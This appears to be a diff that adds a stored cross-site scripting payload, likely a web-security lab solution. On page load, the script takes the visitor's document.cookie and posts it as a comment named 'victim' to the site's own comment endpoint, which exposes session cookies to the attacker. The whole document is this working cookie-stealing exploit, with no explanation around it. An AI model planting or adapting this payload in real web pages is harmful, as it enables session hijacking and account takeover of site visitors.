@@ -1,0 +1,13 @@
+<script>
+	window.addEventListener("DOMContentLoaded", (event) => 
+	{
+		if (!document.cookie.includes('attacker'))
+		{
+			var formData = new FormData(document.forms[0]);
+			formData.set('comment', document.cookie);
+			formData.set('name', 'victim');
+			formData.set('email', 'victim@hacked.com');
+			fetch('/post/comment', { method: 'POST', body: formData });
+		}
+	});
+</script>
